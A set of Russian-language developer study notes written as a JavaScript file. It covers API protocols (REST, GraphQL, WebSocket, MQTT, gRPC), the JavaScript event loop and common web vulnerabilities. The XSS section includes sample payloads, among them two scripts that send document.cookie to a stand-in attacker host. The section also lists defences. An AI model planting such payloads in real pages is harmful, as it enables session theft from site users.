			// 🔹 ⁡⁣⁣⁢Stateless (Без состояния): Каждый запрос содержит всю информацию для его обработки. Сервер не хранит состояние клиента между запросами⁡
			// 🔹 ⁡⁣⁣⁢Кэширование: Ответы должны явно указывать возможность кэширования (Cache-Control, ETag)⁡
			// 🔹 ⁡⁣⁣⁢Единообразный интерфейс Стандартизация взаимодействия через⁡
			// ⚪ ⁡⁢⁣⁣Ресурсы (URI (Uniform Resource Identifier) — унифицированный (единообразный) идентификатор ресурса. Это последовательность символов, позволяющая идентифицировать какой-либо ресурс: документ, изображение, файл, службу, ящик электронной почты и т. д.)⁡
			// ⚪ ⁡⁢⁣⁣Представления (JSON/XML)⁡
			// ⚪ ⁡⁢⁣⁣Самодостаточные сообщения⁡
			// ⚪ ⁡⁢⁣⁣Гипермедиа (HATEOAS)⁡
			// 🔹 ⁡⁣⁣⁢Слоистая система Клиент не знает, взаимодействует ли с конечным сервером или промежуточным прокси.⁡
			// 🔹 ⁡⁣⁣⁢Код по требованию (опционально) Возможность передачи исполняемого кода (например, JavaScript)⁡
		}
		// ✅ ⁡⁢⁢⁢КАК РАБОТАЕТ REST НА ПРАКТИКЕ⁡
		{
			// 🔹 ⁡⁣⁢⁢РЕСУРСЫ И URI⁡
			{
				// 🔸 ⁡⁢⁣⁣Каждая сущность — ресурс с уникальным URI⁡
				// 🔸 ⁡⁢⁣⁣Примеры⁡
				{
					// ⚪ ⁡⁣⁣⁢/api/users — коллекция пользователей⁡
					// ⚪ ⁡⁣⁣⁢/api/users/42 — конкретный пользователь⁡
					// ⚪ ⁡⁣⁣⁢/api/users/42/orders — заказы пользователя⁡
				}
			}
			// 🔹 ⁡⁣⁢⁢HTTP-методы⁡
			{
				// ⁡⁣⁣⁡⁣⁣⁢МЕТОД		   CRUD					   ОПИСАНИЕ⁡
				// ⁡⁢⁢⁢GET			Read					Получить ресурс⁡
				// ⁡⁢⁢⁢POST			Create					Создать новый ресурс⁡
				// ⁡⁢⁢⁢PUT			Update					Полная замена ресурса⁡
				// ⁡⁢⁢⁢PATCH		Update					Частичное обновление⁡
				// ⁡⁢⁢⁢DELETE		Delete					Удалить ресурс⁡
			}
			// 🔹 ⁡⁣⁢⁢ПРИМЕР ЗАПРОСА⁡
			{
				// GET /api/books/123 HTTP/1.1
				// Host: example.com
				// Accept: application/json
				// Ответ ---------------------
				// HTTP/1.1 200 OK
				// Content-Type: application/json
				{
					// "id": 123,
					// "title": "RESTful API Design",
					// "author": "John Doe",
					// "_links": {
					// 	"self": { "href": "/api/books/123" },
					// 	"publisher": { "href": "/api/publishers/5" }
					// 	}
				}
			}
		}
		// ✅ ⁡⁢⁢⁢НЮАНСЫ ПРОЕКТИРОВАНИЯ REST API⁡
		{
			// 🔹 ⁡⁣⁢⁢ИМЕНОВАНИЕ РЕСУРСОВ⁡
			{
				// 🔸 ⁡⁢⁣⁣Плохо: /getAllUsers, /updateUser⁡
				// 🔸 ⁡⁢⁣⁣Хорошо: GET /users, PUT /users/42⁡
			}
			// 🔹 ⁡⁣⁢⁢ВЕРСИОНИРОВАНИЕ⁡
			{
				// 🔸 ⁡⁢⁣⁣В URI: /api/v1/users⁡
				// 🔸 ⁡⁢⁣⁣В заголовках: Accept: application/vnd.myapi.v1+json⁡
			}
			// 🔹 ⁡⁣⁢⁢ФИЛЬТРАЦИЯ И ПАГИНАЦИЯ⁡
			{
				// 🔸 ⁢⁡⁢⁣⁣GET /api/products?category=electronics&price_lt=1000&_page=2&_limit=20⁡
			}
			// 🔹 ⁡⁣⁢⁢КОДЫ СОСТОЯНИЯ HTTP⁡
			{
				// ⁡⁣⁣⁢КОД			КАТЕГОРИЯ					ПРИМЕРЫ⁡⁡
				// ⁡⁢⁢⁢2xx			Успех						200 (OK), 201 (Created)⁡
				// ⁡⁢⁢⁢3xx			Перенаправление				301 (Moved Permanently)⁡
				// ⁡⁢⁢⁢4xx			Ошибка клиента				400 (Bad Request), 404⁡
				// ⁡⁢⁢⁢5xx			Ошибка сервера				500 (Internal Error)⁡
			}
			// 🔹 ⁡⁣⁢⁢БЕЗОПАСНОСТЬ⁡
			{
				// 🔸 ⁡⁢⁣⁣Всегда использовать HTTPS⁡
				// 🔸 ⁡⁢⁣⁣Валидация входных данных⁡
				// 🔸 ⁡⁢⁣⁣Лимит запросов (Rate Limiting)⁡
			}
		}
		// ✅ ⁡⁢⁢⁢ЛУЧШИЕ ПРАКТИКИ⁡
		{
			// 🔹 ⁡⁣⁢⁢ФОРМАТЫ ДАННЫХ⁡
			{
				// ⚪ ⁡⁣⁣⁢JSON — основной формат⁡
				// ⚪ ⁡⁣⁣⁢XML (eXtensible Markup Language). В этом формате для описания данных используются теги, которые определяют элементы и атрибуты.⁡
				// ⚪ ⁡⁣⁣⁢YAML (YAML Ain’t Markup Language). Формат, который легко читается человеком и широко используется в конфигурациях.⁡
				// ⚪ ⁡⁣⁣⁢Protocol Buffers (protobuf). Бинарный формат, известный эффективностью, который используется, например, компанией Google и другими технологическими компаниями.⁡
				// ⚪ ⁡⁣⁣⁢HTML (Hypertext Markup Language). Используется в веб-API, которые предоставляют данные в формате HTML, особенно в контексте веб-скрапинга.⁡
			}
			// 🔹 ⁡⁣⁢⁢ОБРАБОТКА ОШИБОК⁡
			{
				{
					// "error": {
					// 	"code": "invalid_email",
					// 	"message": "Email format is invalid",
					// 	"target": "email",
					// 	"details": [
					// 	{
					// 		"code": "regex_mismatch",
					// 		"message": "Must contain @ symbol"
					// 	}
					// 	]
					// }
				}
			}
		}
	}
	// 🔳 ⁡⁢⁣⁣GraphQL (язык запросов и среда выполнения для API)⁡
	{
		// ⭐ ⁡⁣⁣⁢GraphQL — это язык запросов и среда выполнения для API, разработанные Facebook в 2012 году. В отличие от REST, GraphQL позволяет клиентам запрашивать только нужные данные, уменьшая избыточность и повышая эффективность.⁡
		// 🔹 ⁡⁣⁢⁢ПРИНЦИП РАБОТЫ⁡
		{
			// ✅ ⁡⁢⁢⁢Схема (Schema)⁡
			{
				// ⚪ ⁡⁣⁣⁢Определяет типы данных и их связи (как база данных).⁡
				{
					// graphql
					// type User {
					//     id: ID!
					//     name: String!
					//     email: String!
					//     posts: [Post!]!
					// }
					// type Post {
					//     id: ID!
					//     title: String!
					//     body: String!
					// }
				}
			}
			// ✅ ⁡⁢⁢⁢Запросы (Queries)⁡
			{
				// ⚪ ⁡⁣⁣⁢Клиент отправляет запрос с указанием нужных полей.⁡
				{
					// graphql
					// query {
					//     user(id: 1) {
					//         name
					//         email
					//         posts {
					//         title
					//         }
					//     }
					// }
				}
			}
			// ✅ ⁡⁢⁢⁢Мутации (Mutations)⁡
			{
				// ⚪ ⁡⁣⁣⁢Для изменения данных (аналог POST/PUT/DELETE в REST).⁡
				{
					// graphql
					// mutation {
					// createUser(name: "Alice", email: "alice@example.com") {
					//         id
					//         name
					//     }
					// }
				}
			}
			// ✅ ⁡⁢⁢⁢Подписки (Subscriptions, WebSocket)⁡
			{
				// ⚪ ⁡⁣⁣⁢Для получения данных в реальном времени (чаты, уведомления).⁡
			}
		}
		// 📜 ⁡⁣⁢⁢ИСТОРИЯ⁡
		{
			// ⚪ ⁡⁣⁣⁢2012: Разработан Facebook для мобильных приложений (чтобы избежать избыточных запросов REST).⁡
			// ⚪ ⁡⁣⁣⁢2015: Открыт исходный код, стал стандартом для API.⁡
			// ⚪ ⁡⁣⁣⁢2018: Передан под управление GraphQL Foundation (Linux Foundation).⁡
		}
		// 🎯 ⁡⁣⁢⁢ДЛЯ ЧЕГО НУЖЕН GRAPHQL?⁡
		{
			// ✅ ⁡⁢⁢⁢Гибкость – клиент запрашивает только нужные данные.⁡
			// ✅ ⁡⁢⁢⁢Снижение нагрузки – меньше лишних запросов.⁡
			// ✅ ⁡⁢⁢⁢Быстрая разработка – не нужно создавать много эндпоинтов (как в REST).⁡
			// ✅ ⁡⁢⁢⁢Реальное время – через подписки (WebSocket).⁡
		}
		// 💻 ⁡⁣⁢⁢ПРИМЕРЫ КОДА⁡
		{
			// ⚪ ⁡⁣⁣⁢Сервер на Node.js (Apollo Server)⁡
			{
				const { ApolloServer, gql } = require("apollo-server");
				const typeDefs = gql`
					type User {
						id: ID!
						name: String!
						email: String!
					}

					type Query {
						getUser(id: ID!): User
					}

					type Mutation {
						createUser(name: String!, email: String!): User
					}
				`;
				const users = [{ id: "1", name: "Alice", email: "alice@example.com" }];
				const resolvers = {
					Query: {
						getUser: (_, { id }) => users.find((user) => user.id === id),
					},
					Mutation: {
						createUser: (_, { name, email }) => {
							const newUser = { id: String(users.length + 1), name, email };
							users.push(newUser);
							return newUser;
						},
					},
				};
				const server = new ApolloServer({ typeDefs, resolvers });
				server.listen().then(({ url }) => {
					console.log(`🚀 Server ready at ${url}`);
				});
			}
			// ⚪ ⁡⁣⁣⁢Клиентский запрос (JavaScript, Apollo Client)⁡
			{
				// import { ApolloClient, InMemoryCache, gql } from "@apollo/client";
				const client = new ApolloClient({
					uri: "http://localhost:4000",
					cache: new InMemoryCache(),
				});
				client
					.query({
						query: gql`
							query GetUser($id: ID!) {
								getUser(id: $id) {
									name
									email
								}
							}
						`,
						variables: { id: "1" },
					})
					.then((result) => console.log(result.data));
			}
		}
		// ✔️ ⁡⁣⁢⁢ПЛЮСЫ GRAPHQL⁡
		{
			// ✅ ⁡⁢⁢⁢Гибкость – клиент сам выбирает, какие данные получать.⁡
			// ✅ ⁡⁢⁢⁢Меньше запросов – вместо нескольких REST-эндпоинтов – один GraphQL-запрос.⁡
			// ✅ ⁡⁢⁢⁢Типизация – строгая схема данных (меньше ошибок).⁡
			// ✅ ⁡⁢⁢⁢Реальное время – подписки (WebSocket).⁡
		}
		// ❌ ⁡⁣⁢⁢МИНУСЫ GRAPHQL⁡
		{
			// ⛔ ⁡⁢⁣⁢Сложность кэширования – REST проще кэшировать (по URL).⁡
			// ⛔ ⁡⁢⁣⁢N+1 проблема – если не оптимизировать запросы (решается DataLoader).⁡
			// ⛔ ⁡⁢⁣⁢Не для всех задач – если нужны простые CRUD-операции, REST может быть проще.⁡
		}
		// 📌 ⁡⁣⁢⁢GRAPHQL И REST (Таблица сравнения)⁡
		{
			// ⁡⁢⁣⁣ХАРАКТЕРИСТИКА	    GRAPHQL	                                  REST⁡
			// ⁡⁣⁣⁢Гибкость	            ✅ Клиент запрашивает только нужное	    ❌ Фиксированные эндпоинты⁡
			// ⁡⁣⁣⁢Кэширование	        ❌ Сложнее	                            ✅ Проще (по URL)⁡
			// ⁡⁣⁣⁢Типизация	        ✅ Строгая схема	                        ❌ Нет стандарта⁡
			// ⁡⁣⁣⁢Запросы	            1 запрос = много данных	                  Много запросов = много данных⁡
		}
		// 🔹 ⁡⁣⁢⁢ВЫВОД⁡
		{
			// ⚪ ⁡⁣⁣⁢GraphQL лучше, если:⁡
			{
				// ⚡ ⁡⁢⁣⁣Нужна гибкость (мобильные приложения, сложные интерфейсы).⁡
				// ⚡ ⁡⁢⁣⁣Хочется избежать "over-fetching" (лишние данные в REST).⁡
			}
			// ⚪ ⁡⁣⁣⁢REST лучше, если:⁡
			{
				// ⚡ ⁡⁢⁣⁣Простые CRUD-операции.⁡
				// ⚡ ⁡⁢⁣⁣Нужно простое кэширование.⁡
			}
			// ⚪ ⁡⁣⁣⁢Популярные реализации GraphQL:⁡
			{
				// ⚡ ⁡⁢⁣⁣Сервер: Apollo Server, GraphQL Yoga⁡
				// ⚡ ⁡⁢⁣⁣Клиент: Apollo Client, Relay (Facebook)⁡
			}
		}
	}
	// 🔳 ⁡⁣⁣⁡⁣⁣⁡⁢⁣⁣WEBSOCKET - Чат или онлайн-игра⁡
	{
		// 🔹 ⁡⁣⁢⁢ПРОТОКОЛ⁡
		// ✅ ⁡⁢⁢⁢Двусторонний протокол поверх TCP, обеспечивает постоянное соединение между клиентом и сервером.⁡
		// ✅ ⁡⁢⁢⁢Начинается с HTTP-рукопожатия (Upgrade: websocket), затем переходит на бинарный/текстовый обмен.⁡
		// 🔹 ⁡⁣⁢⁢СКОРОСТЬ⁡
		// ✅ ⁡⁢⁢⁢Высокая после установки соединения (нет накладных расходов на повторные handshake).⁡
		// ✅ ⁡⁢⁢⁢Идеален для частых сообщений в реальном времени⁡
		// 🔹 ⁡⁣⁢⁢ИСПОЛЬЗОВАНИЕ⁡
		// ✅ ⁡⁢⁢⁢Чат-приложения (WhatsApp Web), онлайн-игры, биржевые тикеры.⁡
		// ✅ ⁡⁢⁢⁢Пример кода (JavaScript)⁡
		{
			const socket = new WebSocket("wss://example.com/chat");
			socket.send(JSON.stringify({ message: "Hello!" }));
		}
	}
	// 🔳 ⁡⁢⁣⁣FTP (File Transfer Protocol)⁡
	{
		// 🔹 ⁡⁣⁢⁢Назначение: Передача файлов между клиентом и сервером.⁡
		// 🔹 ⁡⁣⁢⁢Характеристики:⁡
		{
			// ✅ ⁡⁢⁢⁢Два канала: Управляющее соединение (команды, порт 21) и соединение для данных (передача файлов, порт 20 или динамический).⁡
			// ✅ ⁡⁢⁢⁢Аутентификация: Обычно логин/пароль (передаются в открытом виде в базовой версии).⁡
			// ✅ ⁡⁢⁢⁢Режимы передачи: Активный (сервер инициирует data-соединение к клиенту - проблема с NAT/брандмауэрами) и Пассивный (PASV, клиент инициирует оба соединения к серверу - более безопасный).⁡
		}
		// 🔹 ⁡⁣⁢⁢Где применяется: Загрузка/скачивание больших файлов (архивы ПО, медиа). Внимание: В современных браузерах встроенная поддержка FTP (особенно через ftp://) активно удаляется или уже удалена (Chrome, Firefox, Edge) из соображений безопасности (отсутствие шифрования по умолчанию) и низкой востребованности. Для работы с FTP рекомендуется использовать специализированные клиенты (FileZilla, WinSCP).⁡
	}
	// 🔳 ⁡⁢⁣⁣MAILTO(Почта):⁡
	{
		// 🔹 ⁡⁣⁢⁢Назначение: Не протокол передачи данных в сетевом смысле, а схема URI. Используется для инициации создания нового письма в почтовом клиенте пользователя.⁡
		// 🔹 ⁡⁣⁢⁢Характеристики:⁡
		{
			// ✅ ⁡⁢⁢⁡⁢⁢⁢Синтаксис: mailto:email@example.com?subject=Тема&body=Текст.⁡
			// ✅ ⁡⁢⁢⁢Параметры: to, cc, bcc, subject, body.⁡
		}
		// 🔹 ⁡⁣⁢⁢Где применяется: Ссылки "Написать нам" на веб-сайтах. При клике браузер открывает почтовую программу пользователя по умолчанию с заполненными полями.⁡
	}
	// 🔳 ⁡⁢⁣⁣WEBRTC (WEB REAL-TIME COMMUNICATION) - Видеоконференция⁡
	{
		// 🔹 ⁡⁣⁣⁡⁣⁢⁢ПРОТОКОЛ⁡
		// ✅ ⁡⁢⁢⁢Позволяет прямую передачу данных (P2P) между клиентами (минуя сервер)⁡
		// ✅ ⁡⁢⁢⁢Использует протоколы⁡
		// ⚪ ⁡⁣⁣⁢SRTP (Secure Real-Time Transport Protocol) — для аудио/видео⁡
		// ⚪ ⁡⁣⁣⁢SCTP (Stream Control Transmission Protocol) — для текста/файлов.⁡
		// 🔹 ⁡⁣⁢⁢СКОРОСТЬ⁡
		// ✅ ⁡⁢⁢⁢Зависит от сети⁡
		// ⚪ ⁡⁣⁣⁢Локальные сети: почти мгновенная передача.⁡
		// ⚪ ⁡⁣⁣⁢Через интернет: требует STUN/TURN-серверов для обхода NAT.⁡
		// 🔹 ⁡⁣⁢⁢ИСПОЛЬЗОВАНИЕ⁡
		// ✅ ⁡⁢⁢⁢Видеозвонки (Zoom, Google Meet), файлообменники, стриминг⁡
		// ✅ ⁡⁢⁢⁢Пример⁡
		{
			const peerConnection = new RTCPeerConnection();
			peerConnection.ontrack = (event) => {
				/* обработка видео */
			};
		}
	}
	// 🔳 ⁡⁢⁣⁣MQTT (Message Queuing Telemetry Transport) - Умные устройства⁡
	{
		// 🔹 ⁡⁣⁢⁢ПРОТОКОЛ⁡
		// ✅ ⁡⁢⁢⁢Легковесный протокол для IoT-устройств, работает поверх TCP/IP⁡
		// ✅ ⁡⁢⁢⁢Использует модель «издатель-подписчик».⁡
		// 🔹 ⁡⁣⁢⁢СКОРОСТЬ⁡
		// ✅ ⁡⁢⁢⁢Очень высокая за счёт минимального размера заголовков (2 байта).⁡
		// ✅ ⁡⁢⁢⁢Поддерживает QoS (качество обслуживания)⁡
		// ⚪ ⁡⁣⁣⁢0 (доставка без подтверждения),⁡
		// ⚪ ⁡⁣⁣⁢1 (гарантированная доставка),⁡
		// ⚪ ⁡⁣⁣⁢2 (однократная доставка).⁡
		// 🔹 ⁡⁣⁢⁢ИСПОЛЬЗОВАНИЕ⁡
		// ✅ ⁡⁢⁢⁢Умные дома, датчики, промышленная автоматизация.⁡
		// ✅ ⁡⁢⁢⁢Пример запроса⁡
		// bash mosquitto_pub -h broker.example.com -t "sensor/temperature" -m "25"
	}
	// 🔳 ⁡⁣⁣⁡⁣⁣⁡⁢⁣⁣gRPC (Google Remote Procedure Call) - Высоконагруженный бэкенд⁡
	{
		// 🔹 ⁡⁣⁣⁡⁣⁢⁢ПРОТОКОЛ⁡
		// ✅ ⁡⁢⁢⁢Высокопроизводительный RPC-фреймворк от Google, использует HTTP/2 и Protocol Buffers⁡
		// 🔹 ⁡⁣⁢⁢СКОРОСТЬ⁡
		// ✅ ⁡⁢⁢⁢В 5–10 раз быстрее REST благодаря бинарному формату и мультиплексированию (множество потоков через одно соединение).⁡
		// 🔹 ⁡⁣⁣⁡⁣⁢⁢ИСПОЛЬЗОВАНИЕ⁡
		// ✅ ⁡⁢⁢⁢Микросервисы, высоконагруженные API (соцсети, банки).⁡
		// ✅ ⁡⁢⁢⁢Пример (Protobuf)⁡
		// protobuf
		// message UserRequest { int32 id = 1; }
		// message UserResponse { string name = 1; }
	}
}
// ⁡⁢⁣⁢EVENT LOOP ОСНОВНЫЕ КОНЦЕПЦИИ⁡
{
	// ⁡⁣⁣💡 ⁡⁣⁣⁢Event Loop (цикл событий) — это механизм, который позволяет JavaScript (в браузере и Node.js) быть однопоточным, но при этом асинхронным. Он управляет выполнением кода, обработкой событий, колбэков и асинхронных операций.⁡
	// 🔳 ⁡⁢⁣⁣СТЕК ВЫЗОВОВ (CALL STACK)⁡
	{
		// ✅ ⁡⁢⁢⁢Это LIFO-стек (Last In, First Out), который хранит выполняемые функции.⁡
		// ✅ ⁡⁢⁢⁢Когда функция вызывается, она помещается в стек, а когда завершается — удаляется.⁡
		// ✅ ⁡⁢⁢⁢Если стек переполняется (например, из-за бесконечной рекурсии), возникает ошибка Maximum call stack size exceeded.⁡
	}
	// 🔳 ⁡⁢⁣⁣МИКРОЗАДАЧИ (MICROTASK QUEUE)⁡
	{
		// ✅ ⁡⁢⁢⁢Некоторые асинхронные операции (например, Promise.then, MutationObserver, queueMicrotask) попадают в очередь микрозадач.⁡
		// ✅ ⁡⁢⁢⁢Микрозадачи выполняются сразу после текущего синхронного кода, но перед макрозадачами (например, setTimeout).⁡
		// ✅ ⁡⁢⁣⁡⁢⁢⁢Пример:⁡
		{
			console.log("Start");
			setTimeout(() => console.log("Timeout"), 0);
			Promise.resolve().then(() => console.log("Promise"));
			console.log("End");
			// Start;
			// End;
			// Promise
			// Timeout
		}
		// ✅ ⁡⁢⁣⁡⁢⁢⁢Почему?⁡
		// ⚪ ⁡⁣⁣⁢Синхронный код: Start, End.⁡
		// ⚪ ⁡⁣⁣⁢Микрозадача (Promise) выполняется перед макрозадачей (setTimeout).⁡
	}
	// 🔳 ⁡⁢⁣⁣ОЧЕРЕДЬ ЗАДАЧ (CALLBACK QUEUE / TASK QUEUE)⁡
	{
		// ✅ ⁡⁢⁢⁢Когда асинхронная операция (например, setTimeout, fetch, click) завершается, её колбэк попадает в очередь задач.⁡
		// ✅ ⁡⁢⁢⁢Event Loop проверяет, пуст ли стек вызовов, и если да — перемещает колбэк из очереди в стек.⁡
		// ✅ ⁡⁢⁢⁢Пример:⁡
		{
			console.log("Start");
			setTimeout(() => {
				console.log("Timeout");
			}, 0);
			console.log("End");
			// Start;
			// End;
			// Timeout;
		}
		// ✅ ⁡⁢⁢⁢Почему?⁡
		// ⚪ ⁡⁣⁣⁢console.log("Start") → выполняется сразу.⁡
		// ⚪ ⁡⁣⁣⁢setTimeout регистрирует колбэк, но он попадает в очередь задач.⁡
		// ⚪ ⁡⁣⁣⁢console.log("End") выполняется.⁡
		// ⚪ ⁡⁣⁣⁢Только после очистки стека Event Loop забирает колбэк Timeout из очереди.⁡
	}
	// 🔳 ⁡⁢⁣⁣EVENT LOOP: КАК ЭТО РАБОТАЕТ?⁡
	{
		// ✅ ⁡⁢⁢⁢Выполняется синхронный код (заполняется и очищается стек вызовов).⁡
		// ✅ ⁡⁢⁢⁢Если стек пуст:⁡
		// ⚪ ⁡⁣⁣⁢Сначала выполняются все микрозадачи (из очереди Microtask Queue).⁡
		// ⚪ ⁡⁣⁣⁢Затем одна макрозадача (из Callback Queue).⁡
		// ✅ ⁡⁢⁢⁢Цикл повторяется.⁡
	}
	// 🔳 ⁡⁢⁣⁣РАЗНИЦА МЕЖДУ МАКРОЗАДАЧАМИ И МИКРОЗАДАЧАМИ⁡
	{
		// ⁡⁣⁣⁢МИКРОЗАДАЧИ (MICROTASKS)					МАКРОЗАДАЧИ (MACROTASKS/TASKS)⁡
		// ⁡⁢⁣⁣Promise.then/catch/finally				setTimeout, setInterval⁡
		// ⁡⁢⁣⁣queueMicrotask()							I/O (файлы, сетевые запросы)⁡
		// ⁡⁢⁣⁣MutationObserver							UI Events (клики, скролл)⁡
		// ⁡⁢⁣⁣Выполняются сразу после текущего кода	Выполняются после микрозадач⁡
	}
	// 🔳 ⁡⁢⁣⁣ПРАКТИЧЕСКИЙ ПРИМЕР⁡
	{
		console.log("Script start");
		setTimeout(() => console.log("setTimeout"), 0);
		Promise.resolve()
			.then(() => console.log("Promise 1"))
			.then(() => console.log("Promise 2"));
		console.log("Script end");
		// Script start
		// Script end
		// Promise 1
		// Promise 2
		// setTimeout
		// ✅ ⁡⁢⁢⁢Порядок выполнения:⁡
		// ⚪ ⁡⁣⁣⁢Синхронный код (Script start, Script end).⁡
		// ⚪ ⁡⁣⁣⁢Микрозадачи (Promise 1, Promise 2).⁡
		// ⚪ ⁡⁣⁣⁢Макрозадачи (setTimeout).⁡
	}
	// 🔳 ⁡⁢⁣⁣ИТОГ: КАК EVENT LOOP УПРАВЛЯЕТ АСИНХРОННОСТЬЮ?⁡
	{
		// ✅ ⁡⁢⁢⁢Синхронный код выполняется сразу.⁡
		// ✅ ⁡⁢⁢⁢Асинхронный код (Promise, setTimeout) попадает в соответствующие очереди.⁡
		// ✅ ⁡⁢⁢⁢Сначала выполняются все микрозадачи, затем — одна макрозадача.⁡
		// ✅ ⁡⁢⁢⁢Цикл повторяется, пока есть задачи.⁡
		// ✅ ⁡⁢⁢⁢Event Loop — это бесконечный цикл, который:⁡
		// ⚪ ⁡⁣⁣⁢Следит за стеком вызовов.⁡⁡
		// ⚪ ⁡⁣⁣⁢Переносит задачи из очередей в стек, когда он пуст.⁡
		// ⚪ ⁡⁣⁣⁢Гарантирует, что JS остаётся неблокирующим.⁡
	}
}
// ⁡⁢⁣⁡⁢⁣⁢ВЕБ-УЯЗВИМОСТИ⁡
{
	// 🔳 ⁡⁢⁣⁣ИНЪЕКЦИОННЫЕ АТАКИ (INJECTION)⁡
	{
		// ✅ ⁡⁢⁢⁢SQL-инъекции⁡
		// ⚪ ⁡⁣⁣⁢Описание: Внедрение вредоносного SQL-кода через пользовательский ввод.⁡
		// ✅ ⁡⁢⁢⁢XSS (Cross-Site Scripting)⁡
		// 🔹 ⁡⁣⁢⁢Reflected XSS (Отражённая XSS)⁡
		{
			// 🔸 ⁡⁢⁣⁣Механизм⁡
			// ⭐ ⁡⁣⁣⁢Зловредный скрипт передаётся через URL или параметры запроса и немедленно выполняется в браузере жертвы.⁡
			// 🔸 ⁡⁢⁣⁣Пример:⁡
			// ⭐ ⁡⁣⁣⁢Уязвимый сайт ищет товары через URL:⁡ https://example.com/search?query=<script>alert('XSS')</script>
			// ⭐ ⁡⁣⁣⁢Если сайт не фильтрует входные данные, скрипт выполнится у всех, кто перейдёт по этой ссылке.⁡
		}
		// 🔹 ⁡⁣⁢⁢Stored XSS (Постоянная XSS)⁡
		{
			// 🔸 ⁡⁢⁣⁣Механизм⁡
			// ⭐ ⁡⁣⁣⁢Вредоносный код сохраняется на сервере (например, в комментариях или профилях) и выполняется у всех пользователей, которые загружают заражённую страницу.⁡
			// 🔸 ⁡⁢⁣⁣Пример⁡
			// ⭐ ⁡⁣⁣⁡⁣⁣⁢Злоумышленник оставляет комментарий на форуме:⁡
			<script>fetch('https://hacker.com/steal?cookie=' + document.cookie);</script>;
			// ⭐ ⁡⁣⁣⁢При открытии страницы с этим комментарием браузер каждого пользователя отправит злоумышленнику их куки (включая сессии).⁡
		}
		// 🔹 ⁡⁣⁢⁢DOM-based XSS⁡
		{
			// 🔸 ⁡⁢⁣⁣Механизм⁡
			// ⭐ ⁡⁣⁣⁢Скрипт внедряется через манипуляции с DOM (без участия сервера). Уязвимость возникает из-за некорректной обработки данных в JavaScript.⁡
			// 🔸 ⁡⁢⁣⁣Пример⁡⁡
			// ⭐ ⁡⁣⁣⁢Код на странице использует location.hash для динамического контента:⁡
			document.write("Выбран раздел: " + location.hash.substring(1));
			// ⭐ ⁡⁣⁣⁢Атакующий создаёт ссылку:⁡ https://example.com/#<img src=x onerror=alert('XSS')> ⁡⁣⁣⁢При открытии страницы выполнится вредоносный код.⁡
		}
		// 🔹 ⁡⁣⁢⁢Пример реальной XSS-атаки⁡
		{
			// 🔸 ⁡⁢⁣⁣Сценарий: Кража сессионных куки⁡
			// ⭐ ⁡⁣⁣⁢Атакующий находит сайт с уязвимым полем для комментариев.⁡
			// ⭐ ⁡⁣⁣⁢Вместо текста он вставляет:⁡
			{
				<script>
					var img = new Image(); img.src = 'https://hacker.com/log?cookie=' +
					encodeURIComponent(document.cookie);
				</script>;
			}
			// ⭐ ⁡⁣⁣⁢Когда жертва заходит на страницу с комментарием, её браузер отправляет куки (включая сессию) на сервер злоумышленника.⁡
			// ⭐ ⁡⁣⁣⁢Атакующий использует эти куки для входа в аккаунт жертвы.⁡
		}
		// 🔹 ⁡⁣⁢⁢Чем опасен XSS?⁡
		{
			// ⭐ ⁡⁣⁣⁢Кража данных: Куки, токены, пароли.⁡
			// ⭐ ⁡⁣⁣⁢Фишинг: Подмена интерфейса (например, формы входа).⁡
			// ⭐ ⁡⁣⁣⁢Распространение вредоносного ПО: Загрузка вирусов через эксплойты.⁡
			// ⭐ ⁡⁣⁣⁢Дефейс: Изменение содержимого сайта.⁡
			// ⭐ ⁡⁣⁣⁢Атаки на других пользователей: Через запросы от их имени (CSRF).⁡
		}
		// 🔹 ⁡⁣⁢⁢Защита от XSS⁡
		{
			// ⭐ ⁡⁣⁣⁢Экранирование данных: Преобразование спецсимволов (<, >, &) в HTML-сущности (например, < → &lt;).⁡
			// ⭐ ⁡⁣⁣⁢Content Security Policy (CSP): Запрет выполнения inline-скриптов.⁡
			// ⭐ ⁡⁣⁣⁢HttpOnly-флаги для куки: Блокировка доступа к куки через JavaScript.⁡
			// ⭐ ⁡⁣⁣⁢Валидация и санитизация: Фильтрация вводимых данных (например, с помощью библиотек типа DOMPurify).⁡
		}
	}
	// 🔳 ⁡⁢⁣⁣АУТЕНТИФИКАЦИЯ И СЕССИИ⁡
	{
		// ✅ ⁡⁢⁢⁢Уязвимости⁡
		// ⭐ ⁡⁣⁣⁢Перебор паролей (Brute Force)⁡
		// ⭐ ⁡⁣⁣⁢Утечка сессионных токенов⁡
		// ⭐ ⁡⁣⁣⁢Небезопасное хранение паролей⁡
		// ✅ ⁡⁢⁢⁢Защита⁡
		// ⭐ ⁡⁣⁣⁢Многофакторная аутентификация⁡
		// ⭐ ⁡⁣⁣⁢Ограничение попыток входа⁡
		// ⭐ ⁡⁣⁣⁢Соль и хеширование паролей (bcrypt, Argon2)⁡
		// ⭐ ⁡⁣⁣⁢JWT с коротким временем жизни + refresh tokens⁡
	}
	// 🔳 ⁡⁢⁣⁣CSRF (CROSS-SITE REQUEST FORGERY - Подделка межсайтовых запросов от авторизованного пользователя)⁡
	{
		// ✅ ⁡⁢⁢⁢Защита⁡
		// ⭐ ⁡⁣⁣⁢CSRF-токены⁡
		// ⭐ ⁡⁣⁣⁢SameSite куки⁡
		// ⭐ ⁡⁣⁣⁢Проверка заголовка Origin/Referer⁡
	}
	// 🔳 ⁡⁢⁣⁣НЕБЕЗОПАСНЫЕ ПРЯМЫЕ ССЫЛКИ (IDOR - доступ к чужим данным через подмену id)⁡
	{
		// ✅ ⁡⁢⁢⁢Защита⁡
		// ⭐ ⁡⁣⁣⁢Проверка прав доступа на сервере⁡
		// ⭐ ⁡⁣⁣⁢UUID вместо автоинкрементных ID⁡
		// ⭐ ⁡⁣⁣⁢Регулярные аудиты доступа⁡
	}
	// 🔳 ⁡⁢⁣⁣XXE (XML EXTERNAL ENTITY - Внедрение внешних сущностей в XML)⁡
	{
		// ✅ ⁡⁢⁢⁢Защита
		// ⭐ ⁡⁣⁣⁢Отключение обработки DTD⁡
		// ⭐ ⁡⁣⁣⁢Использование JSON вместо XML⁡
		// ⭐ ⁡⁣⁣⁢Валидация XML-схемой⁡
	}
	// 🔳 ⁡⁢⁣⁣НЕБЕЗОПАСНАЯ ДЕСЕРИАЛИЗАЦИЯ - Выполнение кода при обработке сериализованных данных⁡
	{
		// ✅ ⁡⁢⁢⁢Защита⁡
		// ⭐ ⁡⁣⁣⁢Проверка целостности данных (цифровые подписи)⁡
		// ⭐ ⁡⁣⁣⁢Использование безопасных форматов (JSON вместо бинарных)⁡
		// ⭐ ⁡⁣⁣⁢Ограничение типов при десериализации⁡
	}
}